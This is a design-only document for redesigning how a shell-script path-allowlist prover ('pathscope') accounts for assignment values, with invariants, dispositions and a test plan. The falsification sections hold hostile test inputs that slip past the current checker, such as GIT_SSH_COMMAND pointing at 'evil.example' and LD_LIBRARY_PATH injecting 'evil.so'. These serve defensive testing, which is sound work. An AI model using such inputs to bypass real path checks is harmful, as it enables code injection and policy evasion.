Status: DESIGN ONLY — NO CODE CHANGE, NOT ACCEPTED

# Pathscope Option C — occurrence-accounting redesign

Date: 2026-08-15  
Baseline: `e05298966716beeaf27d51325978bb1a39b83b50`  
Current prover blob: `695ca9c951e31f53da9580d41326583d71086bb3`  
Current prover SHA-256: `28848D60F74A7C668DB3019BBAC58550F4A55C1C02038C013153316C711EDF9C`

## 1. Authority, scope, and gate contract

Barış selected Option C in `WPI_OWNER_DECISIONS_2026-08-15_NIGHT.md` §D1: replace one
accounting layer so every admitted member reaches exactly one terminal disposition, then
run one fresh flagship execution audit. This design does not authorize implementation,
another repair cycle, or a second audit. If that one audit finds a required change, the
lane returns to the owner boundary.

This round changes one documentation file and no executable byte. Its artifact tier is T2
(design/evidence documentation); no model review is dispatched because the kickoff orders
the design to be produced without another AI. The implementation described here remains
T1 local non-economic product code and is audited once at the work-package boundary under
the explicit owner contract.

Allowed in this round: this file only. Forbidden: every line of `pathscope_prover.py`, all
Pine/parity/MTC/trading surfaces, all host/network/deployment/service/credential/broker/
exchange/ARM/order/TESTNET/mainnet work, merge, and push.

The value is not three new recognizers. It is a runtime-checkable proof that the universe
enumerated before classification is the same occurrence universe that reaches reporting.

## 2. The source diagnosis and the replacement boundary

The current source says coverage is fail-closed and that zero facts plus PASS is a bug
(`pathscope_prover.py:2-17`), but the assignment layer does not enforce that statement:

- `record_assignment_value` expands one complete RHS and reduces its provenance to one
  `sources` set before any member exists (`pathscope_prover.py:1319-1370`).
- `record_assignment_members` makes a whole-value candidate and optional word/list
  candidates, then deduplicates strings into `pool` and reduces every empty occurrence to
  one `empty_member` Boolean (`pathscope_prover.py:1430-1510`). `bare` members append no
  `Use` and no `Issue` (`pathscope_prover.py:1491-1497`).
- `output_report` groups `Use` objects first by normalized value, set-deduplicates issues,
  rules, evidence, and source names, and only then decides the run (`pathscope_prover.py:
  2942-3016`). By that point occurrence identity cannot be recovered.

“Reporting layer” in this design therefore means the complete path from admission of a
script assignment value through occurrence enumeration, provenance binding, terminal
classification, and emission of occurrence-bearing records. It is not merely the final
`print` loop.

### 2.1 Kept parser and analysis machinery

The following behavior is kept, not redesigned:

- shell tokenization, quote handling, heredoc collection, and substitution harvesting in
  `ShellLexer` (`pathscope_prover.py:138-452`);
- the rendered scalar expansion semantics of `expand_word` (`pathscope_prover.py:514-647`),
  constants parsing and allowlist parsing (`pathscope_prover.py:650-754`);
- the registered argv grammar (`pathscope_prover.py:757-1094`);
- command, wrapper, redirection, function, control-flow, and nested-source traversal outside
  assignment accounting (`pathscope_prover.py:1512-2933`);
- CLI arguments and input reading (`pathscope_prover.py:3019-3038`); and
- the lexical-only claim: no symlink resolution, mount proof, or host probe
  (`pathscope_prover.py:2-17,2936-2939`).

`expand_word` must gain trace metadata, but its rendered text and known/unknown decisions
must remain byte-for-byte behavior-compatible. That is instrumentation of the kept scalar
expander, not a new shell parser.

### 2.2 Replaced or mechanically extended seam

| Current source | Implementation disposition |
|---|---|
| `Value`, `Use` (`pathscope_prover.py:74-93`) | Extend with immutable expansion segments and optional occurrence identity; do not change existing rendered-value semantics. |
| `expand_word` (`514-647`) | Mechanically produce an ordered source-to-rendered trace while producing the same `text`, `reason`, and transitive constant-source set as today. |
| `Analyzer.__init__` (`1119-1128`) | Add deterministic analyzer/value counters, admitted-value ledger, member-occurrence ledger, disposition ledger, and accounting-fault ledger. |
| `merge` (`1218-1223`) | Merge the ledgers without deduplication; rebase display line numbers but never rewrite occurrence IDs. |
| `record_assignment_value`, `assignment_member_kind`, `split_list_members`, `record_assignment_members` (`1319-1510`) | Replace completely with admission, span-preserving split, total classification, and one terminal disposition per occurrence. Remove `pool` and `empty_member`. |
| Assignment prefix (`2564-2566`), `env` assignment (`1788-1791`), declaration routing (`1267-1317`) | Keep reachability and shell-environment binding behavior. Their accounting call must create exactly one admitted-value occurrence per assignment token occurrence. |
| `Analyzer.run` return plumbing (`2866-2933`) and `main` handoff (`3039-3040`) | Carry the immutable ledgers to reporting. |
| `output_report` (`2942-3016`) | Replace value-first adjudication with occurrence-first adjudication. A compatibility projection may still group candidate values, but it cannot decide PASS and cannot be the only report of multiplicity or provenance. |

The current generic `Issue` deduplication at `pathscope_prover.py:1131-1134` can remain for
non-assignment parser/coverage issues. No member terminal disposition may pass through that
deduplicating container or through `set(issues + provenance)` at lines 2961-2964.

### 2.3 Downstream machine-grammar seam

`composite_pathproof.py` is a real consumer. `SubprocessPathProver` accepts only the current
record prefixes and rejects any unknown line as `prover_output_unknown_record`
(`composite_pathproof.py:2129-2142,2274-2305`); it also reconciles counts, issue kinds,
terminal rc, and reason (`composite_pathproof.py:2306-2390`). Therefore the implementation
must do one of these, explicitly:

1. add occurrence records to that parser as a mechanical compatibility change in the same
   T1 work package, with its own grammar/count checks; or
2. encode the full occurrence ledger without adding an unknown prefix and prove that every
   disposition, including allowed non-path scalar dispositions, remains independently
   parseable.

Option 1 is the clean design. Hiding a ledger in `uses=`, mislabeling scalars as `PATH`, or
silently relying on the composite to ignore it is forbidden. If implementation authority
is later restricted to `pathscope_prover.py` alone, this consumer is a concrete blocker to
resolve at the owner boundary before code, not a reason to weaken the invariant.

## 3. Exact definitions

### 3.1 Admitted value

An **admitted value** is one occurrence of a script-side `NAME=VALUE` assignment that has
reached the common assignment-accounting call through exactly one of these already-existing
sites:

1. assignment prefix or standalone assignment (`pathscope_prover.py:2564-2568`);
2. `env` assignment after its expanded word matches `ASSIGN_RE`
   (`pathscope_prover.py:1741-1797`); or
3. one of `local`, `declare`, `typeset`, `export`, or `readonly`, after the raw or expanded
   operand matches `NAME=VALUE` (`pathscope_prover.py:1267-1317,2569-2572`).

Admission happens before successful RHS expansion. A raw assignment whose RHS cannot be
expanded is still admitted and receives one opaque whole member with an unresolved terminal
disposition. An `env` or declaration operand that cannot even be established as an
assignment remains the existing coverage STOP; it is not silently promoted into this
universe. Constants-file entries are preregistered inputs (`pathscope_prover.py:650-668`),
not admitted script values.

Every occurrence is separate. Identical text, identical source line, identical normalized
value, and identical primitive do not merge two admitted values.

### 3.2 Expansion trace and exact source substring

Expansion of an admitted RHS produces:

`ExpansionTrace(raw_rhs, rendered_text, segments)`

Each immutable segment carries:

- half-open rendered offsets `[rendered_start, rendered_end)`;
- half-open token-local raw offsets `[raw_start, raw_end)` and the exact
  `raw_rhs[raw_start:raw_end]` substring;
- the rendered substring contributed by that raw slice;
- origin kind: literal, escape, quote-elision, parameter expansion, fallback expansion, or
  semantic PWD substitution; and
- the exact transitive preregistered constant names that produced that segment.

Rendered, non-empty segments must be ordered, non-overlapping, and cover every rendered
character exactly once. Quote characters and other zero-output raw syntax may have
zero-width rendered segments so the raw spelling remains auditable. The concatenation of
rendered segment text must equal `rendered_text`. A trace gap, overlap, out-of-range span,
or reconstruction mismatch is an accounting fault and rc 3.

Token-local offsets are intentional: `Token` currently carries text and line but no column
or absolute byte offset (`pathscope_prover.py:67-71`). The stable value occurrence ID plus
line, raw RHS, and half-open raw slices uniquely identify the exact substring within the
parsed token without pretending the current parser captured a file-byte column that it did
not capture.

### 3.3 Member occurrence

A **member** is an occurrence, never a string key:

`MemberOccurrence(member_id, value_id, reading, ordinal, rendered_span, raw_slices, text)`

The deterministic splitter admits these readings without a dangerous-shape predicate:

1. `whole`: exactly one member for every admitted value, including an empty value; an
   unknown expansion produces one opaque whole member.
2. `colon`: when at least one `:` separator exists outside a URI's protected
   `scheme://authority` span, every separator position produces the ordered `n + 1`
   occurrence slices, including leading, trailing, adjacent, and repeated empties. The
   current URI state-machine intent at `pathscope_prover.py:1400-1428` is retained, but its
   return type becomes occurrence slices rather than strings.
3. `words`: whenever the rendered value contains whitespace and has at least two non-empty
   `\S+` matches, every match is an ordered occurrence. This is unconditional; the current
   option-or-slash activation predicate at lines 1459-1462 is removed.
4. `word-colon`: each word occurrence containing a live colon separator is split again,
   retaining both the word occurrence and every nested colon occurrence as distinct reading
   members. This preserves the current union-of-readings conservatism without deduplication.

The fixed reading order is `whole`, `colon`, `words`, then `word-colon`; within a reading,
source order is final. A member ID is deterministic and hierarchical, for example
`A0.V0007.colon.M0002@15:15`. The analyzer scope prefix distinguishes root, nested shell,
and substitution analyzers; the value sequence distinguishes identical assignments; the
reading and ordinal distinguish duplicate and empty members. IDs never depend on rendered
text or normalized value.

For a colon reading with `n` live separator offsets, the runtime must independently assert
`member_count == n + 1`. For a words reading it must assert that member count equals the
number of `\S+` matches. These grammar-cardinality checks prevent a dedupe performed before
identity assignment from making both sides of the later conservation equation equally
wrong.

### 3.4 Terminal disposition

A **terminal disposition** is one immutable record keyed by exactly one `member_id`, chosen
from the closed set in §5. Candidate normalization, allowlist matches, and provenance are
fields on that one record; they are not second dispositions.

## 4. The conservation statement — the accepting invariant

For every admitted value occurrence `v`, let:

- `M(v)` be the multiset of member IDs emitted once by the immutable splitter;
- `D(v)` be the multiset of member IDs on terminal-disposition records; and
- `S(v,r)` be the independently counted separator/match positions for reading `r`.

The runtime property is:

```text
|M(v)| >= 1
Counter(M(v)) == Counter(D(v))
for every member_id in M(v): Counter(D(v))[member_id] == 1
for every reading r: |M(v,r)| == grammar_cardinality(S(v,r))
no disposition references a member_id outside M(v)
no disposition kind exists outside the closed set
```

The run-level property is the multiset union over values:

```text
⊎v M(v) == ⊎v D(v)
```

This is checked after splitting and again immediately before reporting. The report must
carry, per value, `member_count`, `disposition_count`, and `conserved=true`, plus one
occurrence-bearing terminal record per member. An auditor does not infer conservation from
rc or unique path counts; it recomputes the two Counters from the records and verifies the
per-reading cardinalities.

PASS is permitted only when all of the following are true:

1. every per-value and run-level conservation check passes;
2. every provenance-binding check in §6 passes;
3. there is no existing parse, coverage, unresolved-path, unresolved-endpoint, or
   non-member provenance issue;
4. every member disposition is `ALLOWED_WITH_REASON`; and
5. there is no `FORBIDDEN_WITH_REASON` or `UNRESOLVED_FAIL_CLOSED` disposition.

Thus zero emitted facts cannot be a pass for an admitted value: admission guarantees at
least one whole member, and that member must have exactly one printed terminal record.

## 5. Closed terminal-disposition set

| Disposition | When it is assigned | Run effect |
|---|---|---|
| `ALLOWED_WITH_REASON` | The member is a resolved filesystem path or endpoint matched by the allowlist and, where allowlisted provenance is required, its exact member provenance is non-empty; it is an explicitly modeled non-sink whole scalar/empty scalar; or it is a non-path whole container whose colon/words children are all separately present in the immutable member ledger. The reason token names which rule proved it. | Eligible for rc 0 only if every other member is also allowed and all invariants pass. |
| `FORBIDDEN_WITH_REASON` | A member resolves to a filesystem path or endpoint and at least one required use has no matching allowlist rule. The record carries normalized value, domain, and failed rule context. | rc 1 only when there is no unresolved condition or accounting fault. |
| `UNRESOLVED_FAIL_CLOSED` | Expansion is unknown; consumer/word/list search semantics are not modeled; an option member is not decomposed; PWD for an empty list member is unavailable; an otherwise allowed path/endpoint lacks exact member provenance; a reading is ambiguous; normalization fails; or the total classifier reaches its default arm. | rc 3. |

The set is closed. There is no `bare`, `ignored`, `not-interesting`, `duplicate`, or empty
fallthrough. A case fitting no explicit rule is, by definition,
`UNRESOLVED_FAIL_CLOSED reason=member_classifier_no_terminal_rule`.

The terminal classifier is ordered and total:

1. unknown expansion or failed normalization is unresolved;
2. every `words` or `word-colon` occurrence is unresolved because the analyzer does not
   know which consumer grammar assigns its role; any normalized path/endpoint and
   allowlist result is retained as candidate data on that one disposition;
3. every empty colon occurrence is resolved through PWD and then allowed, forbidden, or
   unresolved;
4. every other path/endpoint occurrence is allowed or forbidden by its member-local
   allowlist/provenance result;
5. a non-path `whole` occurrence that owns an active colon/words reading is allowed as
   `reason=whole_container_decomposed` only after the reading/cardinality checks prove all
   child occurrences exist; it does not authenticate or override any child disposition;
6. an empty whole scalar is allowed as `reason=empty_scalar_no_lexical_sink`;
7. a one-member whole scalar containing no path, endpoint, list separator, or whitespace is
   allowed as `reason=whole_scalar_no_lexical_sink`; and
8. every remaining case is unresolved by the default arm.

Steps 5-7 preserve the current narrow lexical contract while still reporting and counting
the member. A bare occurrence inside a colon, words, or word-colon reading is not granted a
scalar/container reason; its consumer search semantics are unresolved and it receives rc 3.
This distinction keeps the published benign scalar controls meaningful while closing the
audited bare list-member hole. The remaining single-bare-scalar limitation is disclosed in
§11.

Existing issue precedence is retained: any unresolved condition produces rc 3 before a
forbidden candidate can produce rc 1 (`pathscope_prover.py:3009-3016`). Candidate facts may
be attached to an unresolved member record, but that does not create a second disposition.

## 6. Provenance binding

For every non-empty member `m`, provenance is computed only from trace segments whose
rendered intervals intersect `m.rendered_span`:

```text
expected_sources(m) = union(segment.sources for segment intersecting m.rendered_span)
actual_sources(m) == expected_sources(m)
```

For a split inside one variable expansion, each resulting member may legitimately name the
same variable because the exact `$NAME` raw slice produced both rendered slices. For two
adjacent expansions, only the expansions intersecting the member contribute. Literal
substrings contribute no constant provenance.

An empty colon member has a zero-width raw/rendered anchor tied to its exact boundary and
separator ordinal. Its semantic value is PWD, so its sources are exactly `{PWD}` when PWD
is pinned, never `RHS_sources ∪ {PWD}`. The current union at
`pathscope_prover.py:1501-1510` is removed.

Each terminal record prints `raw_slices`, the JSON-escaped exact raw substring(s), rendered
span, rendered member text, and member-local sources. The runtime recomputes the equality
above immediately before verdict selection. Attaching the complete RHS source union to a
literal neighbor is therefore representable as a concrete mismatch — the neighbor's raw
slices do not intersect the `$ROOT` segment — and forces
`PATHSCOPE verdict=REJECT rc=3 reason=accounting_invariant_failed`.

For `$ROOT/lib:/safe/literal`, the first colon member overlaps `$ROOT` and has
`sources=ROOT`; the second overlaps only `/safe/literal` and has `sources=NONE`. If the
literal member is otherwise allowlisted, its one terminal disposition is
`UNRESOLVED_FAIL_CLOSED reason=allowlisted_member_without_exact_provenance`, not ALLOW plus
a separate issue.

## 7. Identity, multiplicity, and reporting

The admitted-value and member ledgers are ordered lists/tuples. No dictionary keyed by
text, normalized path, endpoint, line, primitive, or evidence string may own the accounting
universe.

Required removals/replacements:

- remove `pool` and all `candidate not in pool` / `member not in pool` tests
  (`pathscope_prover.py:1473-1490`);
- replace the single `empty_member` Boolean (`1476-1488,1498-1510`) with one occurrence per
  zero-width slice;
- do not route member dispositions through `Issue` deduplication (`1131-1134`) or the
  report's `set(...)` (`2961-2964`);
- replace set-deduplicated `evidence` and aggregate source names
  (`2993-2997`) with occurrence-bearing evidence in stable member order; and
- if a compatibility PATH/ENDPOINT table remains grouped by normalized value
  (`2943-2953`), label it as a projection and include every contributing `member_id`. It
  cannot be used for conservation, provenance, or PASS.

Duplicate values therefore print separate records. Three empty members print three records.
Sorting is by analyzer/value/reading/ordinal identity, never by value text. The report must
be deterministic for the same frozen bytes.

The authoritative record grammar must expose at least:

```text
VALUE_ACCOUNT value_id=... line=... site=... member_count=N disposition_count=N conserved=true
MEMBER member_id=... value_id=... reading=... ordinal=... rendered_span=... raw_slices=... text=... sources=... disposition=... reason=...
```

Fields must use deterministic ASCII escaping so repeated whitespace, newlines, empty text,
and non-ASCII raw spelling cannot corrupt record boundaries. As §2.3 requires, the
composite consumer must be taught these exact additive records and must independently
reconcile their counts before it accepts the prover's terminal line.

## 8. Fail-closed behavior when accounting fails

Any trace, identity, split-cardinality, provenance-binding, closed-enum, Counter, or report
reconciliation failure emits:

```text
PATHSCOPE accounting_fault_count=<positive integer>
ACCOUNTING_FAULT value_id=<id-or-NONE> member_id=<id-or-NONE> reason=<stable token>
PATHSCOPE conservation=FAIL admitted_value_count=<n> member_count=<m> disposition_count=<d>
PATHSCOPE verdict=REJECT rc=3 reason=accounting_invariant_failed
```

No `PATHSCOPE verdict=PASS` line is printed on that path. The process returns `RC_PARSE`
(3), the existing incomplete/static-stop code (`pathscope_prover.py:30-31,3009-3011`).
An exception raised while creating the ledger is caught at the accounting boundary and
converted into one of these stable faults; it must not escape as a traceback or be
misclassified as rc 1.

The composite adapter must require exactly one accounting summary, require zero faults,
recompute the per-value and global counts, and reject unknown/duplicate member IDs before
it considers the terminal rc. This preserves its existing status-before-adjudication style
at `composite_pathproof.py:2272-2376`.

## 9. Regression preservation contract

### 9.1 What stays literally identical

The fixture bytes, constants, allowlists, pinned old prover blobs, and pinned RP6/RP7 block
blobs in the published harness remain unchanged (`SELF_QA_PATHSCOPE.md:275-307,309-491`).
The existing `$CASES`, `$C2CASES`, and `$C3CASES` lists remain intact
(`SELF_QA_PATHSCOPE.md:493-610`). New Option-C attacks go in a separate family so the
existing `RED_R1.txt`, `RED_R3.txt`, and `RED_R4.txt` transcript bytes and published hashes
remain reproducible (`SELF_QA_PATHSCOPE.md:127-144,650-653`).

Against the redesigned prover, every published fixture in
`SELF_QA_PATHSCOPE.md:310-384` that does not admit a script assignment must remain
byte-identical. The only assignment-admitting exceptions in that range are `green`,
`assembled`, `dynamic`, `nested`, and `backtick`; those gain occurrence-accounting records.
No parser, command-grammar, path-normalization, endpoint-normalization, or allowlist result
outside the seam may change.

The full harness must still run verbatim under its published command, outer rc 0, stderr
empty, no `TRANSCRIPT_LEAK`, and deterministic paired output
(`SELF_QA_PATHSCOPE.md:109-145,200-675`). The current R5 blob is frozen as the literal RED
subject for Option C; the redesigned candidate is a new GREEN column. Existing old-blob
RED columns are not regenerated from guessed behavior.

### 9.2 What keeps the same semantic result but gains accounting records

- All seven P9 fixtures retain their current rc and existing path facts
  (`SELF_QA_PATHSCOPE.md:677-703`).
- P10 and P11 retain every currently observed dangerous candidate and their current rc,
  except the two deliberate changes in §9.3. Existing FORBID information may move into the
  `candidate_*` fields of one unresolved member disposition, but it may not disappear.
- `c3_empty_only` and `c3_empty_only_out` retain rc 0 and rc 1 respectively, but `:` must
  report two distinct empty-member dispositions rather than the current collapsed PWD row.
- `assign_benign` and `c2_benign_scalars` retain rc 0, while every empty occurrence in
  `IFS=:` is individually reported.
- `c2_bare_soname` and `c3_scalar_ctl` retain rc 0 through the explicit
  `whole_scalar_no_lexical_sink` disposition, not through silence.
- RP6-P0 and RP7-WPI-RO retain rc 3 under both placeholder and real constants. No existing
  forbidden or unresolved fact may be lost; member counts and exact provenance may add
  rows or narrow source attribution.

For assignment-admitting fixtures, compatibility is tested by two comparisons: the full
new occurrence report against its new fence, and a named legacy-candidate projection
against the R5 transcript. Differences in that projection require a row-by-row reason;
“the report was redesigned” is not sufficient.

### 9.3 Legitimate existing semantic changes

Exactly two existing fixture verdicts are expected to tighten under the closed grammar:

1. `c2_benign_words` changes rc 0 to rc 3. Any multiword value now admits the word/command
   reading unconditionally; `Permission` and `denied` are bare word members whose consumer
   semantics are unresolved. The old option-or-slash activation at
   `pathscope_prover.py:1459-1462` is the F1 class and cannot remain for this control.
2. `c3_colon_whole` changes rc 1 to rc 3. The whole pathname remains a forbidden candidate
   and the `$BASE` member remains allowed, but the literal `relative` colon member is no
   longer silently ignored as `bare`; it receives an unresolved disposition. Existing
   precedence makes rc 3 truthful.

No other existing rc change is authorized by this design. If implementation observes one,
it must stop, explain the source reachability, and return to design review rather than
silently regenerate the fence.

## 10. Falsification plan

Every new regression is closure evidence only after literal RED against the current R5
blob (or an equivalent deliberate mutation) and GREEN against the redesigned bytes, with
commands and real output recorded. Reading the source is not D026 closure evidence.

### 10.1 F1 — command text and a bare URI/list member

Exact inputs, using the published `ROOT`, `PWD`, `URL`, and allowlist:

```bash
GIT_SSH_COMMAND="ssh evil.example" cat "$ROOT/f"
LD_LIBRARY_PATH=$URL:evil.so cat "$ROOT/f"
```

The executing audit measured both as `PASS rc=0`. In the new design the first value always
admits two words; both get occurrence IDs and unresolved word/consumer dispositions. The
second value always admits two colon members; `$URL` is an allowed endpoint with exact URL
provenance, while literal `evil.so` is a bare list member with unresolved consumer-search
semantics. Conservation can succeed, but PASS cannot: at least one terminal disposition is
unresolved, so rc is 3.

Mutation: restore the option-or-slash word activation, or skip the bare colon member after
enumeration. The former must make the RED input pass only if the new word-reading fence is
actually discriminating; the latter must fail the Counter equation before verdict.

### 10.2 F2 — provenance laundering

Exact input:

```bash
LD_LIBRARY_PATH=$ROOT/lib:/safe/literal cat "$ROOT/f"
```

The audit measured the literal neighbor as `sources=ROOT` and `PASS rc=0`; the literal by
itself produced a provenance STOP. In the new trace, `$ROOT/lib` overlaps the ROOT segment
and `/safe/literal` overlaps only literal segments. The latter therefore has
`sources=NONE` and one unresolved provenance disposition. Assigning the complete RHS union
to it violates `actual_sources == expected_sources` and forces the accounting-failure rc 3
even before the allowlist verdict is considered.

Mutation: replace member-local source intersection with the whole-trace union. The runtime
provenance-binding invariant, not a string assertion in the test, must turn GREEN into rc 3.

### 10.3 F3 — duplicates and repeated empties

Exact inputs:

```bash
LD_LIBRARY_PATH=/etc/escape:/etc/escape cat "$ROOT/f"
LD_LIBRARY_PATH=:: cat "$ROOT/f"
```

The audit measured one printed `/etc/escape` use for two occurrences and one PWD row for
three empty occurrences. The redesign produces two distinct forbidden member IDs in the
first case. In the second, two separators independently require three zero-width members,
each with its own ID, raw boundary anchor, `{PWD}` provenance, and disposition, plus the
separately identified whole container member. With PWD `/safe`, rc 0 remains legitimate
only after all four allowed dispositions are printed.

Mutations: reintroduce text deduplication after enumeration and reintroduce one Boolean for
empties. The first must violate `Counter(M) == Counter(D)`; the second must also violate the
independent `separator_count + 1` cardinality. This is what prevents a bad splitter and a
bad disposition ledger from agreeing on the same collapsed universe.

### 10.4 New adjacent attacks invented for Option C

These are source-derived predictions, not claims of executed evidence in this design-only
round. The implementation round must run each exact input against blob
`695ca9c951e31f53da9580d41326583d71086bb3` before calling it RED.

| Attack | Exact input | Why R5 is predicted to miss it | Why the redesign catches it |
|---|---|---|---|
| Endpoint normalization collision plus provenance laundering | `X=$URL:http://127.0.0.1:8790/other cat "$ROOT/f"` | One RHS-wide source union is passed to both URI members (`pathscope_prover.py:1343-1370`), and normalized endpoints are grouped by value (`2943-2959`), so the literal endpoint can inherit URL provenance and collapse with its neighbor. Reachability must be executed. | Two URI occurrence IDs survive normalization; the literal URI raw slice has `sources=NONE` and becomes unresolved. |
| Interleaved repeated empties | `LD_LIBRARY_PATH=::$ROOT/lib:: cat "$ROOT/f"` | Four separators produce four empty slices plus one path, but `empty_member` is one Boolean (`1476-1510`). R5 is predicted to report one PWD use. | `separator_count=4` requires five colon members: four separate PWD occurrences and one ROOT path occurrence. Any collapse is an accounting fault. |
| Quoted-newline command text | `GIT_SSH_COMMAND="ssh\nevil.example" cat "$ROOT/f"` where `\n` is a literal newline in the quoted value | `rendered.split()` finds two words, but neither an option nor `/`, so the current activation predicate is false (`1459-1462`); the whole value is `bare` and emits nothing (`1372-1398,1491-1497`). R5 is predicted to pass. | All whitespace activates the words reading. Both exact word occurrences terminate unresolved and rc is 3. |
| Same-line duplicate assignment occurrences | `X=/etc/escape X=/etc/escape cat "$ROOT/f"` | Both assignments are reached (`2564-2566`), but final grouping and set evidence can render one indistinguishable row (`2943-2997`). | Separate value sequence IDs make two separate member/disposition records even with identical line, text, primitive, and normalized value. |

### 10.5 Conservation mutations that must be RED

In addition to the defect-specific arms, the implementation harness must deliberately:

1. delete one disposition append after member enumeration;
2. duplicate one disposition append;
3. inject a disposition carrying an unknown `member_id`;
4. return an unknown disposition enum;
5. deduplicate members before identity assignment while leaving separator counts intact;
6. attach a non-overlapping constant source to a literal member; and
7. suppress the printed MEMBER line while retaining the in-memory disposition.

All seven must return rc 3 with `reason=accounting_invariant_failed`; none may reach a PASS
line. Arm 7 proves report conservation, not just in-memory conservation.

## 11. Honest residual

This redesign does not prove the following:

1. **Complete Bash or command grammar outside admitted assignment values.** The lexer and
   registered command machinery remain as they are (`pathscope_prover.py:138-452,
   757-1094,1512-2933`). A silent sink elsewhere is a parser/grammar defect, not closed by
   this accounting invariant.
2. **Consumer-specific meaning of a one-member bare whole scalar.** The explicit
   `whole_scalar_no_lexical_sink` disposition preserves `LD_PRELOAD=libc.so`, `LC_ALL=C`,
   and `count=1` controls, but it does not prove dynamic-loader, PATH, module, or other
   consumer search behavior. The bare occurrence is no longer silent; the residual is the
   decision to accept that narrow lexical non-sink class. A future claim covering consumer
   search paths needs a separate semantic registry or must turn this disposition into
   unresolved.
3. **Which alternate reading a real consumer chooses.** The design admits a conservative
   union of whole, colon, words, and nested word-colon readings. It can over-reject values
   such as prose, and `c2_benign_words` intentionally demonstrates that consequence. It
   does not prove variable-specific consumer semantics.
4. **Attached option-path extraction.** An option member such as `-I/usr/include` is
   terminal unresolved; the embedded path may appear only as candidate text. The run
   stops, but the path itself is not proven.
5. **Absolute source-file byte columns.** Current tokens lack columns
   (`pathscope_prover.py:67-71`); provenance binds to exact token-local raw slices plus a
   stable occurrence ID and source line.
6. **Multiplicity of non-member generic Issues.** Existing `Issue` equality dedupe may still
   merge identical non-assignment issues (`pathscope_prover.py:1131-1134,2961-2964`). The
   member ledger never uses it, so F3 is closed only for admitted assignment members.
7. **Host object identity.** Lexical allowlisting does not establish symlink targets, mount
   boundaries, file existence, namespaces, or runtime opens (`pathscope_prover.py:2-17,
   2936-2939`). No host proof is added or implied.
8. **Downstream acceptance until the composite parser is updated and tested.** A correct
   prover that emits an unknown occurrence record is currently rejected by
   `composite_pathproof.py:2287-2305`. The additive grammar integration is mandatory and
   mechanical, but it is not implemented in this design round.

These residuals are not reasons to weaken conservation. They bound the claim that may be
printed after the redesign: every admitted assignment member occurrence has one exact,
reported terminal disposition under the stated lexical readings. They do not broaden that
claim into runtime filesystem safety or complete shell semantics.

## 12. Implementation-round acceptance checklist

The next round is not complete until all of these are true:

1. the source seam in §2 is the only behavioral area changed; the kept parser renders all
   old non-assignment fixtures byte-identically;
2. no `pool`, member text dedupe, normalized-value identity, or single empty Boolean remains;
3. trace reconstruction, reading cardinality, member/disposition Counter equality,
   provenance equality, closed-enum, and printed-record reconciliation all run before PASS;
4. every F1/F2/F3 input and every §10.4 attack has literal R5 RED/current GREEN evidence;
5. every §10.5 mutation is discriminating under D026;
6. the existing harness runs verbatim, old RED transcript identities reproduce, the two
   authorized existing rc changes are the only rc changes, and every other changed fence is
   itemized;
7. the composite output consumer recognizes and independently reconciles the occurrence
   grammar rather than ignoring it;
8. Python 3.12 feature parsing and the installed runtime execution both succeed; inability
   to run an actual 3.12 interpreter is reported honestly if still true;
9. stderr is empty, output is deterministic, and no machine-specific path leaks into a
   transcript; and
10. the fresh flagship execution audit receives the frozen diff, full literal harness
    output, exact RED/GREEN commands and outputs, mutation evidence, and this design — no
    implementer session context.

Only after those checks may the one authorized fresh flagship audit decide acceptance.
